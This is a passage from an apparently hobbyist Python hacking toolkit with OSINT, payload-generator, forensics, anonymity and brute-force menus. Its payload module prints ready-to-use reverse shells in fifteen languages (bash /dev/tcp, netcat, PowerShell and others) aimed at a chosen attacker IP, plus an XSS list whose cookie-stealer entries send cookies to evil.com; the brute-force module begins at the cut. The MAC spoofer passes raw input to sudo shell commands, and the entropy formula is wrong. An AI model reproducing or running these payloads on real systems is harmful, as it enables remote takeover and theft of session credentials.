                    ["Country", data.get('country', 'N/A')],
                    ["Country Code", data.get('countryCode', 'N/A')],
                    ["Region", data.get('regionName', 'N/A')],
                    ["City", data.get('city', 'N/A')],
                    ["ZIP", data.get('zip', 'N/A')],
                    ["Latitude", str(data.get('lat', 'N/A'))],
                    ["Longitude", str(data.get('lon', 'N/A'))],
                    ["Timezone", data.get('timezone', 'N/A')],
                    ["ISP", data.get('isp', 'N/A')],
                    ["Organization", data.get('org', 'N/A')],
                    ["AS", data.get('as', 'N/A')],
                ]
                ui.table("IP Geolocation", ["Property", "Value"], results)
            else:
                ui.error("Could not locate IP")
                
        except Exception as e:
            ui.error(f"Error: {e}")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def email_osint():
        """Email OSINT"""
        ui.clear()
        ui.banner()
        ui.hacker("EMAIL OSINT")
        
        email = input(f"\n{c.YELLOW}Enter email: {c.RESET}").strip()
        if not email:
            ui.error("No email specified")
            return
            
        # Validate format
        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
            ui.error("Invalid email format")
            return
            
        results = []
        
        # Extract parts
        local, domain = email.split('@')
        results.append(["Email", email])
        results.append(["Local part", local])
        results.append(["Domain", domain])
        
        # Check for breaches via API (simulated)
        results.append(["Format", "Valid"])
        
        # Pattern analysis
        if '.' in local:
            results.append(["Pattern", "firstname.lastname"])
        elif '_' in local:
            results.append(["Pattern", "firstname_lastname"])
        elif local.isdigit():
            results.append(["Pattern", "Numeric"])
        else:
            results.append(["Pattern", "Single word"])
            
        # Check if disposable
        disposable_domains = ['tempmail.com', 'guerrillamail.com', '10minutemail.com', 
                            'throwaway.email', 'mailinator.com']
        if domain.lower() in disposable_domains:
            results.append(["Type", "Disposable email"])
        else:
            results.append(["Type", "Regular email"])
            
        ui.table("Email Analysis", ["Property", "Value"], results)
        
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

# ============================================================================
# PAYLOAD GENERATOR MODULE
# ============================================================================

class PayloadGenerator:
    """Payload generation tools"""
    
    MODULE_NAME = "Payload Generator"
    MODULE_DESC = "Reverse shells, XSS payloads, encoders"
    
    @staticmethod
    def reverse_shell():
        """Generate reverse shell payloads"""
        ui.clear()
        ui.banner()
        ui.hacker("REVERSE SHELL GENERATOR")
        
        ip = input(f"\n{c.YELLOW}Enter LHOST (your IP): {c.RESET}").strip()
        port = input(f"{c.YELLOW}Enter LPORT (default 4444): {c.RESET}").strip() or "4444"
        
        if not ip:
            ui.error("No IP specified")
            return
            
        shells = {
            "Bash TCP": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "Bash UDP": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
            "Bash exec": f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "Netcat": f"nc -e /bin/sh {ip} {port}",
            "NC mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "Java": f"Runtime.getRuntime().exec(new String[]{{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"}});",
            "PowerShell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "Awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{ printf \"shell> \" |& s; s |& getline c; if(c) {{ system(c) }} }} }}'",
            "Gawk": f"gawk 'BEGIN {{ P=\"/inet/tcp/{port}/{ip}\"; while( (P |& getline c) > 0 ) {{ print c |& P; close(P); }} }}'",
            "Lua": f"lua -e 'require(\"socket\");require(\"os\");local s=socket.tcp();s:connect(\"{ip}\",{port});os.execute(\"/bin/sh -i <&3 >&3 2>&3\");'",
        }
        
        print(f"\n{c.CYAN}Available reverse shells:{c.RESET}")
        for i, name in enumerate(shells.keys(), 1):
            print(f"  {c.YELLOW}{i}.{c.RESET} {name}")
            
        choice = input(f"\n{c.YELLOW}Select shell (or 'all'): {c.RESET}").strip()
        
        if choice.lower() == 'all':
            for name, payload in shells.items():
                print(f"\n{c.GREEN}=== {name} ==={c.RESET}")
                print(payload)
        else:
            try:
                idx = int(choice) - 1
                name = list(shells.keys())[idx]
                print(f"\n{c.GREEN}=== {name} Reverse Shell ==={c.RESET}")
                print(shells[name])
            except:
                ui.error("Invalid selection")
                
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def xss_payloads():
        """XSS payload collection"""
        ui.clear()
        ui.banner()
        ui.hacker("XSS PAYLOAD COLLECTION")
        
        payloads = [
            ("<script>alert('XSS')</script>", "Basic script tag"),
            ("<img src=x onerror=alert('XSS')>", "Image onerror"),
            ("<svg onload=alert('XSS')>", "SVG onload"),
            ("<body onload=alert('XSS')>", "Body onload"),
            ("<iframe src='javascript:alert(1)'>", "Iframe javascript"),
            ("<input onfocus=alert('XSS') autofocus>", "Input autofocus"),
            ("<marquee onstart=alert('XSS')>", "Marquee onstart"),
            ("<details open ontoggle=alert('XSS')>", "Details ontoggle"),
            ("'><script>alert('XSS')</script>", "Single quote breakout"),
            ("\"><script>alert('XSS')</script>", "Double quote breakout"),
            ("javascript:alert('XSS')", "Javascript protocol"),
            ("<a href=\"javascript:alert('XSS')\">click</a>", "Anchor href"),
            ("<form action=\"javascript:alert('XSS')\"><input type=submit>", "Form action"),
            ("<object data=\"javascript:alert('XSS')\">", "Object data"),
            ("<embed src=\"javascript:alert('XSS')\">", "Embed src"),
            ("';alert('XSS');//", "JS string breakout"),
            ("</script><script>alert('XSS')</script>", "Script tag breakout"),
            ("<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">", "Base64 encoded"),
            ("<img src=x onerror=\"document.location='http://evil.com/?c='+document.cookie\">", "Cookie stealer"),
            ("<svg/onload=fetch('http://evil.com/?c='+document.cookie)>", "Fetch exfil"),
            ("<<script>alert('XSS')//<<script>", "Nested script"),
            ("<img/src='x'onerror=alert('XSS')>", "No spaces"),
            ("<svg><script>alert&#40;'XSS'&#41;</script>", "HTML entities"),
            ("<math><maction xlink:href='javascript:alert(1)'>CLICKME</maction></math>", "MathML"),
            ("{{constructor.constructor('alert(1)')()}}", "Angular template injection"),
        ]
        
        print(f"\n{c.CYAN}XSS Payloads ({len(payloads)}):{c.RESET}\n")
        for payload, desc in payloads:
            print(f"{c.YELLOW}Payload:{c.RESET} {payload}")
            print(f"{c.DIM}Description: {desc}{c.RESET}\n")
            
        input(f"{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def encoder():
        """Encode/decode payloads"""
        ui.clear()
        ui.banner()
        ui.hacker("PAYLOAD ENCODER/DECODER")
        
        print(f"\n{c.CYAN}Encoding options:{c.RESET}")
        print(f"  {c.YELLOW}1.{c.RESET} Base64 Encode")
        print(f"  {c.YELLOW}2.{c.RESET} Base64 Decode")
        print(f"  {c.YELLOW}3.{c.RESET} URL Encode")
        print(f"  {c.YELLOW}4.{c.RESET} URL Decode")
        print(f"  {c.YELLOW}5.{c.RESET} Hex Encode")
        print(f"  {c.YELLOW}6.{c.RESET} Hex Decode")
        print(f"  {c.YELLOW}7.{c.RESET} HTML Encode")
        print(f"  {c.YELLOW}8.{c.RESET} HTML Decode")
        print(f"  {c.YELLOW}9.{c.RESET} ROT13")
        print(f"  {c.YELLOW}10.{c.RESET} Double URL Encode")
        
        choice = input(f"\n{c.YELLOW}Select option: {c.RESET}").strip()
        data = input(f"{c.YELLOW}Enter data: {c.RESET}").strip()
        
        if not data:
            ui.error("No data specified")
            return
            
        try:
            if choice == '1':
                result = base64.b64encode(data.encode()).decode()
            elif choice == '2':
                result = base64.b64decode(data.encode()).decode()
            elif choice == '3':
                result = urllib.parse.quote(data)
            elif choice == '4':
                result = urllib.parse.unquote(data)
            elif choice == '5':
                result = data.encode().hex()
            elif choice == '6':
                result = bytes.fromhex(data).decode()
            elif choice == '7':
                result = data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')
            elif choice == '8':
                result = data.replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace('&#39;', "'")
            elif choice == '9':
                result = ''.join(chr((ord(c) - 97 + 13) % 26 + 97) if c.islower() else chr((ord(c) - 65 + 13) % 26 + 65) if c.isupper() else c for c in data)
            elif choice == '10':
                result = urllib.parse.quote(urllib.parse.quote(data))
            else:
                ui.error("Invalid option")
                return
                
            print(f"\n{c.GREEN}Result:{c.RESET}")
            print(result)
        except Exception as e:
            ui.error(f"Error: {e}")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

# ============================================================================
# FORENSICS MODULE
# ============================================================================

class Forensics:
    """Digital forensics tools"""
    
    MODULE_NAME = "Forensics"
    MODULE_DESC = "File analysis, metadata extraction, memory analysis"
    
    @staticmethod
    def file_analysis():
        """Analyze file types and content"""
        ui.clear()
        ui.banner()
        ui.hacker("FILE ANALYSIS")
        
        filepath = input(f"\n{c.YELLOW}Enter file path: {c.RESET}").strip()
        if not filepath or not os.path.exists(filepath):
            ui.error("File not found")
            return
            
        results = []
        
        # Basic file info
        file_stat = os.stat(filepath)
        results.append(["File Name", os.path.basename(filepath)])
        results.append(["Path", filepath])
        results.append(["Size", f"{file_stat.st_size:,} bytes"])
        results.append(["Created", datetime.fromtimestamp(file_stat.st_ctime).strftime('%Y-%m-%d %H:%M:%S')])
        results.append(["Modified", datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')])
        results.append(["Accessed", datetime.fromtimestamp(file_stat.st_atime).strftime('%Y-%m-%d %H:%M:%S')])
        
        # File type detection
        try:
            with open(filepath, 'rb') as f:
                header = f.read(32)
                
            # Magic bytes detection
            magic_signatures = {
                b'\x89PNG\r\n\x1a\n': 'PNG Image',
                b'\xff\xd8\xff': 'JPEG Image',
                b'GIF87a': 'GIF Image',
                b'GIF89a': 'GIF Image',
                b'PK\x03\x04': 'ZIP Archive',
                b'Rar!\x1a\x07': 'RAR Archive',
                b'\x1f\x8b\x08': 'GZIP Archive',
                b'BZh': 'BZIP2 Archive',
                b'\x7fELF': 'ELF Executable',
                b'MZ': 'Windows Executable (EXE)',
                b'\xca\xfe\xba\xbe': 'Java Class',
                b'%PDF': 'PDF Document',
                b'PK': 'Office Document (ZIP-based)',
                b'\xd0\xcf\x11\xe0': 'Office Document (OLE)',
                b'SQLite': 'SQLite Database',
                b'\x25\x21': 'PostScript/PDF',
            }
            
            detected_type = "Unknown"
            for sig, ftype in magic_signatures.items():
                if header.startswith(sig):
                    detected_type = ftype
                    break
                    
            # Check for text files
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    f.read(1024)
                if detected_type == "Unknown":
                    detected_type = "Text File (UTF-8)"
            except:
                try:
                    with open(filepath, 'r', encoding='latin-1') as f:
                        f.read(1024)
                    if detected_type == "Unknown":
                        detected_type = "Text File (Latin-1)"
                except:
                    pass
                    
            results.append(["Detected Type", detected_type])
            
            # Hash calculation
            md5 = hashlib.md5()
            sha1 = hashlib.sha1()
            sha256 = hashlib.sha256()
            
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(8192), b''):
                    md5.update(chunk)
                    sha1.update(chunk)
                    sha256.update(chunk)
                    
            results.append(["MD5", md5.hexdigest()])
            results.append(["SHA-1", sha1.hexdigest()])
            results.append(["SHA-256", sha256.hexdigest()])
            
        except Exception as e:
            results.append(["Error", str(e)])
            
        ui.table("File Analysis", ["Property", "Value"], results)
        
        # Entropy analysis
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
                
            if len(data) > 0:
                entropy = Forensics._calculate_entropy(data)
                results.append(["Entropy", f"{entropy:.4f}"])
                
                if entropy > 7.5:
                    ui.warning(f"High entropy ({entropy:.2f}) - Possibly encrypted or compressed")
                elif entropy < 5:
                    ui.info(f"Low entropy ({entropy:.2f}) - Likely text or structured data")
                else:
                    ui.info(f"Entropy: {entropy:.2f}")
        except:
            pass
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def _calculate_entropy(data: bytes) -> float:
        """Calculate Shannon entropy"""
        if not data:
            return 0
            
        entropy = 0
        for x in range(256):
            p_x = data.count(x) / len(data)
            if p_x > 0:
                entropy -= p_x * (p_x.bit_length() - 1)
        return entropy
        
    @staticmethod
    def metadata_extractor():
        """Extract metadata from files"""
        ui.clear()
        ui.banner()
        ui.hacker("METADATA EXTRACTOR")
        
        filepath = input(f"\n{c.YELLOW}Enter file path: {c.RESET}").strip()
        if not filepath or not os.path.exists(filepath):
            ui.error("File not found")
            return
            
        results = []
        
        # Basic metadata
        file_stat = os.stat(filepath)
        results.append(["File", os.path.basename(filepath)])
        results.append(["Size", f"{file_stat.st_size:,} bytes"])
        
        # Extension-based analysis
        ext = os.path.splitext(filepath)[1].lower()
        results.append(["Extension", ext if ext else "None"])
        
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
                
            # Image metadata
            if ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']:
                ui.info("Analyzing image file...")
                
                # JPEG EXIF detection
                if ext in ['.jpg', '.jpeg'] and content.startswith(b'\xff\xd8'):
                    results.append(["Format", "JPEG"])
                    
                    # Look for EXIF
                    exif_start = content.find(b'Exif\x00')
                    if exif_start != -1:
                        results.append(["EXIF", "Present"])
                        
                        # Try to extract some EXIF data
                        try:
                            # Find common EXIF tags
                            if b'Canon' in content:
                                results.append(["Camera", "Canon"])
                            elif b'NIKON' in content:
                                results.append(["Camera", "Nikon"])
                            elif b'Sony' in content:
                                results.append(["Camera", "Sony"])
                            elif b'Apple' in content:
                                results.append(["Camera", "Apple (iPhone)"])
                            elif b'Samsung' in content:
                                results.append(["Camera", "Samsung"])
                        except:
                            pass
                    else:
                        results.append(["EXIF", "Not found"])
                        
                # PNG chunks
                elif ext == '.png' and content.startswith(b'\x89PNG'):
                    results.append(["Format", "PNG"])
                    
                    # Parse PNG chunks
                    pos = 8
                    while pos < len(content) - 8:
                        chunk_len = struct.unpack('>I', content[pos:pos+4])[0]
                        chunk_type = content[pos+4:pos+8].decode('ascii', errors='ignore')
                        
                        if chunk_type == 'IHDR':
                            width, height = struct.unpack('>II', content[pos+8:pos+16])
                            results.append(["Width", str(width)])
                            results.append(["Height", str(height)])
                        elif chunk_type == 'tEXt':
                            try:
                                text = content[pos+8:pos+8+chunk_len].decode('utf-8', errors='ignore')
                                if '\x00' in text:
                                    key, value = text.split('\x00', 1)
                                    results.append([f"PNG:{key}", value[:50]])
                            except:
                                pass
                        elif chunk_type == 'IEND':
                            break
                            
                        pos += 12 + chunk_len
                        
            # PDF metadata
            elif ext == '.pdf' and content.startswith(b'%PDF'):
                ui.info("Analyzing PDF file...")
                results.append(["Format", "PDF"])
                
                # Extract PDF version
                version_match = re.search(rb'%PDF-(\d+\.\d+)', content)
                if version_match:
                    results.append(["PDF Version", version_match.group(1).decode()])
                    
                # Look for metadata
                info_match = re.search(rb'/Title\s*\(([^)]+)\)', content)
                if info_match:
                    results.append(["Title", info_match.group(1).decode('utf-8', errors='ignore')])
                    
                author_match = re.search(rb'/Author\s*\(([^)]+)\)', content)
                if author_match:
                    results.append(["Author", author_match.group(1).decode('utf-8', errors='ignore')])
                    
                creator_match = re.search(rb'/Creator\s*\(([^)]+)\)', content)
                if creator_match:
                    results.append(["Creator", creator_match.group(1).decode('utf-8', errors='ignore')])
                    
                producer_match = re.search(rb'/Producer\s*\(([^)]+)\)', content)
                if producer_match:
                    results.append(["Producer", producer_match.group(1).decode('utf-8', errors='ignore')])
                    
            # ZIP/Office metadata
            elif ext in ['.zip', '.docx', '.xlsx', '.pptx', '.odt']:
                ui.info("Analyzing archive/Office file...")
                
                if ext == '.zip':
                    results.append(["Format", "ZIP Archive"])
                else:
                    results.append(["Format", f"Office Document ({ext})"])
                    
                # Check for internal files
                if content.startswith(b'PK\x03\x04'):
                    pos = 0
                    files = []
                    while pos < len(content) - 30:
                        if content[pos:pos+4] == b'PK\x03\x04':
                            try:
                                name_len = struct.unpack('<H', content[pos+26:pos+28])[0]
                                extra_len = struct.unpack('<H', content[pos+28:pos+30])[0]
                                filename = content[pos+30:pos+30+name_len].decode('utf-8', errors='ignore')
                                if filename:
                                    files.append(filename)
                                pos += 30 + name_len + extra_len
                            except:
                                break
                        else:
                            pos += 1
                            
                    if files:
                        results.append(["Files", str(len(files))])
                        for f in files[:5]:
                            results.append(["  →", f[:40]])
                        if len(files) > 5:
                            results.append(["  →", f"... and {len(files)-5} more"])
                            
            # Executable metadata
            elif ext in ['.exe', '.dll'] and content.startswith(b'MZ'):
                ui.info("Analyzing Windows executable...")
                results.append(["Format", "Windows Executable"])
                
                # PE header location
                pe_offset = struct.unpack('<I', content[0x3c:0x40])[0]
                if content[pe_offset:pe_offset+4] == b'PE\x00\x00':
                    results.append(["PE Header", "Valid"])
                    
                    # Machine type
                    machine = struct.unpack('<H', content[pe_offset+4:pe_offset+6])[0]
                    machine_types = {
                        0x14c: 'i386',
                        0x8664: 'AMD64',
                        0x1c0: 'ARM',
                        0xaa64: 'ARM64',
                    }
                    results.append(["Architecture", machine_types.get(machine, f"Unknown ({hex(machine)})")])
                    
            # Text file analysis
            elif ext in ['.txt', '.py', '.js', '.html', '.css', '.json', '.xml', '.md']:
                ui.info("Analyzing text file...")
                
                try:
                    text = content.decode('utf-8')
                    lines = text.split('\n')
                    words = text.split()
                    
                    results.append(["Lines", str(len(lines))])
                    results.append(["Words", str(len(words))])
                    results.append(["Characters", str(len(text))])
                    
                    # Detect language
                    if ext == '.py':
                        imports = re.findall(r'^(?:import|from)\s+(\S+)', text, re.MULTILINE)
                        if imports:
                            results.append(["Python Imports", ', '.join(imports[:5])])
                    elif ext == '.js':
                        requires = re.findall(r'require\([\'"]([^\'"]+)[\'"]\)', text)
                        if requires:
                            results.append(["JS Requires", ', '.join(requires[:5])])
                            
                except:
                    results.append(["Encoding", "Binary or non-UTF8"])
                    
            else:
                ui.info("Generic file analysis...")
                results.append(["Format", "Unknown/Binary"])
                
        except Exception as e:
            results.append(["Analysis Error", str(e)])
            
        ui.table("Metadata Extraction", ["Property", "Value"], results)
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def string_extractor():
        """Extract readable strings from binary files"""
        ui.clear()
        ui.banner()
        ui.hacker("STRING EXTRACTOR")
        
        filepath = input(f"\n{c.YELLOW}Enter file path: {c.RESET}").strip()
        if not filepath or not os.path.exists(filepath):
            ui.error("File not found")
            return
            
        min_length = int(input(f"{c.YELLOW}Minimum string length (default 4): {c.RESET}").strip() or "4")
        
        ui.info(f"Extracting strings (min {min_length} chars)...")
        
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
                
            # Extract printable ASCII strings
            strings = []
            current = []
            
            for byte in data:
                if 32 <= byte <= 126:  # Printable ASCII
                    current.append(chr(byte))
                else:
                    if len(current) >= min_length:
                        strings.append(''.join(current))
                    current = []
                    
            if len(current) >= min_length:
                strings.append(''.join(current))
                
            # Filter interesting strings
            interesting = []
            patterns = [
                (r'https?://[^\s]+', 'URL'),
                (r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', 'Email'),
                (r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', 'IP Address'),
                (r'password|passwd|pwd|secret|key|token', 'Credential', re.IGNORECASE),
                (r'C:\\[^\s]+', 'Windows Path'),
                (r'/[a-zA-Z0-9_/.-]+', 'Unix Path'),
            ]
            
            for s in strings:
                for pattern, ptype, *flags in patterns:
                    if re.search(pattern, s, flags[0] if flags else 0):
                        interesting.append([ptype, s[:60]])
                        break
                        
            if interesting:
                ui.success(f"Found {len(interesting)} interesting strings")
                ui.table("Interesting Strings", ["Type", "Value"], interesting[:30])
            else:
                ui.warning("No interesting strings found")
                
            # Show all strings option
            if len(strings) > 0:
                print(f"\n{c.DIM}Total strings found: {len(strings)}{c.RESET}")
                show_all = input(f"{c.YELLOW}Show all strings? (y/n): {c.RESET}").strip().lower()
                if show_all == 'y':
                    for s in strings[:100]:
                        print(f"  {s}")
                    if len(strings) > 100:
                        print(f"  {c.DIM}... and {len(strings)-100} more{c.RESET}")
                        
        except Exception as e:
            ui.error(f"Error: {e}")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

# ============================================================================
# ANONYMITY MODULE
# ============================================================================

class Anonymity:
    """Anonymity and privacy tools"""
    
    MODULE_NAME = "Anonymity Tools"
    MODULE_DESC = "Tor, proxy chains, privacy tools"
    
    @staticmethod
    def tor_checker():
        """Check if Tor is running and configure"""
        ui.clear()
        ui.banner()
        ui.hacker("TOR CHECKER")
        
        results = []
        
        # Check Tor service
        ui.info("Checking Tor status...")
        
        # Try to connect to Tor control port
        tor_running = False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', 9050))  # Tor SOCKS port
            if result == 0:
                tor_running = True
                results.append(["SOCKS Port 9050", "Open - Tor running"])
            else:
                results.append(["SOCKS Port 9050", "Closed - Tor not running"])
            sock.close()
        except:
            results.append(["SOCKS Port 9050", "Cannot check"])
            
        # Check control port
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', 9051))  # Tor control port
            if result == 0:
                results.append(["Control Port 9051", "Open"])
            else:
                results.append(["Control Port 9051", "Closed"])
            sock.close()
        except:
            results.append(["Control Port 9051", "Cannot check"])
            
        # Check if Tor browser is installed (common paths)
        tor_paths = [
            os.path.expanduser('~/.tor'),
            '/usr/share/tor',
            'C:\\Program Files\\Tor Browser',
            'C:\\Program Files (x86)\\Tor Browser',
            os.path.expanduser('~/Desktop/Tor Browser'),
        ]
        
        for path in tor_paths:
            if os.path.exists(path):
                results.append(["Tor Installation", f"Found at {path}"])
                break
        else:
            results.append(["Tor Installation", "Not found in common paths"])
            
        ui.table("Tor Status", ["Check", "Result"], results)
        
        # Check current IP
        if tor_running:
            ui.info("\nChecking your IP through Tor...")
            try:
                # Use requests with Tor proxy if available
                if HAS_REQUESTS:
                    proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }
                    try:
                        import socks
                        response = requests.get('https://check.torproject.org/api/ip', 
                                              proxies=proxies, timeout=10)
                        if response.status_code == 200:
                            data = response.json()
                            ui.success(f"Your Tor IP: {data.get('Ip', 'Unknown')}")
                            ui.success("You are connected to Tor!")
                    except:
                        ui.warning("Install 'requests[socks]' for Tor IP check: pip install requests[socks]")
            except:
                pass
        else:
            ui.warning("\nTor is not running. Start Tor Browser or tor service.")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def proxy_tools():
        """Proxy configuration tools"""
        ui.clear()
        ui.banner()
        ui.hacker("PROXY TOOLS")
        
        print(f"\n{c.CYAN}Proxy Options:{c.RESET}")
        print(f"  {c.YELLOW}1.{c.RESET} Check current IP")
        print(f"  {c.YELLOW}2.{c.RESET} Test proxy connection")
        print(f"  {c.YELLOW}3.{c.RESET} Generate proxy chains config")
        
        choice = input(f"\n{c.YELLOW}Select: {c.RESET}").strip()
        
        if choice == "1":
            ui.info("Checking your public IP...")
            try:
                if HAS_REQUESTS:
                    response = requests.get('https://api.ipify.org?format=json', timeout=10)
                    data = response.json()
                    ui.success(f"Your IP: {data['ip']}")
                    
                    # Get more info
                    response = requests.get(f"http://ip-api.com/json/{data['ip']}", timeout=10)
                    info = response.json()
                    if info.get('status') == 'success':
                        print(f"  {c.CYAN}Country:{c.RESET} {info.get('country', 'N/A')}")
                        print(f"  {c.CYAN}City:{c.RESET} {info.get('city', 'N/A')}")
                        print(f"  {c.CYAN}ISP:{c.RESET} {info.get('isp', 'N/A')}")
                else:
                    ui.error("Install 'requests' module: pip install requests")
            except Exception as e:
                ui.error(f"Error: {e}")
                
        elif choice == "2":
            proxy = input(f"{c.YELLOW}Enter proxy (host:port): {c.RESET}").strip()
            if not proxy:
                ui.error("No proxy specified")
            else:
                ui.info(f"Testing proxy {proxy}...")
                try:
                    if HAS_REQUESTS:
                        proxies = {
                            'http': f'http://{proxy}',
                            'https': f'http://{proxy}'
                        }
                        start = time.time()
                        response = requests.get('https://api.ipify.org', proxies=proxies, timeout=10)
                        elapsed = time.time() - start
                        ui.success(f"Proxy working! Response time: {elapsed:.2f}s")
                        ui.info(f"IP through proxy: {response.text}")
                    else:
                        ui.error("Install 'requests' module")
                except Exception as e:
                    ui.error(f"Proxy test failed: {e}")
                    
        elif choice == "3":
            ui.info("Generating proxychains config...")
            
            config = """# Proxychains config generated by TRAUMA
# Save to /etc/proxychains.conf or ~/.proxychains/proxychains.conf

strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Add your proxies here:
# socks4 127.0.0.1 9050
# socks5 127.0.0.1 9050
# http 127.0.0.1 8080

# Example Tor proxy:
socks5 127.0.0.1 9050
"""
            print(f"\n{c.GREEN}{config}{c.RESET}")
            
            save = input(f"\n{c.YELLOW}Save to proxychains.conf? (y/n): {c.RESET}").strip().lower()
            if save == 'y':
                with open('proxychains.conf', 'w') as f:
                    f.write(config)
                ui.success("Saved to proxychains.conf")
                
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def mac_spoofer():
        """MAC address spoofer (Linux/Mac only)"""
        ui.clear()
        ui.banner()
        ui.hacker("MAC SPOOFER")
        
        if platform.system().lower() == 'windows':
            ui.warning("MAC spoofing on Windows requires third-party tools")
            ui.info("Consider using Technitium MAC Address Changer")
            input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
            return
            
        ui.info("Available network interfaces:")
        
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            print(result.stdout)
        except:
            try:
                result = subprocess.run(['ifconfig'], capture_output=True, text=True)
                print(result.stdout[:1000])
            except:
                ui.error("Could not list interfaces")
                
        interface = input(f"\n{c.YELLOW}Enter interface (e.g., eth0, wlan0): {c.RESET}").strip()
        if not interface:
            ui.error("No interface specified")
            return
            
        print(f"\n{c.CYAN}Options:{c.RESET}")
        print(f"  {c.YELLOW}1.{c.RESET} Generate random MAC")
        print(f"  {c.YELLOW}2.{c.RESET} Enter custom MAC")
        print(f"  {c.YELLOW}3.{c.RESET} Reset to original")
        
        choice = input(f"\n{c.YELLOW}Select: {c.RESET}").strip()
        
        if choice == "1":
            # Generate random MAC (locally administered)
            mac = f"02:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
            ui.info(f"Generated MAC: {mac}")
        elif choice == "2":
            mac = input(f"{c.YELLOW}Enter MAC (XX:XX:XX:XX:XX:XX): {c.RESET}").strip()
        elif choice == "3":
            ui.info("Resetting to original MAC...")
            os.system(f'sudo ip link set dev {interface} down')
            os.system(f'sudo ip link set dev {interface} address permanent')
            os.system(f'sudo ip link set dev {interface} up')
            ui.success("MAC reset")
            input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
            return
        else:
            ui.error("Invalid option")
            return
            
        # Apply MAC change
        ui.warning("This requires sudo privileges")
        confirm = input(f"{c.YELLOW}Continue? (y/n): {c.RESET}").strip().lower()
        
        if confirm == 'y':
            os.system(f'sudo ip link set dev {interface} down')
            os.system(f'sudo ip link set dev {interface} address {mac}')
            os.system(f'sudo ip link set dev {interface} up')
            ui.success(f"MAC changed to {mac}")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

# ============================================================================
# BRUTE FORCE MODULE
# ============================================================================

class BruteForce:
    """Brute force attack tools"""
    
    MODULE_NAME = "Brute Force"
    MODULE_DESC = "SSH, FTP, HTTP brute force attacks"
    
    @staticmethod
    def ssh_brute():
        """SSH brute force"""
        ui.clear()
        ui.banner()
        ui.hacker("SSH BRUTE FORCE")
